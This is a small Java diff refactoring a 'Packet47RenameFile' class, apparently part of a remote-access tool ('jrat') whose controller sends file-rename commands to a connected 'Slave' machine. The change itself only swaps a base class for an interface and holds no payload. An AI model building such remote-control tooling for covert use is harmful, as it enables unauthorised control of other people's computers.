@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class Packet47RenameFile extends AbstractOutgoingPacket {
+public class Packet47RenameFile implements OutgoingPacket {
 
 	private String file;
 	private String dest;
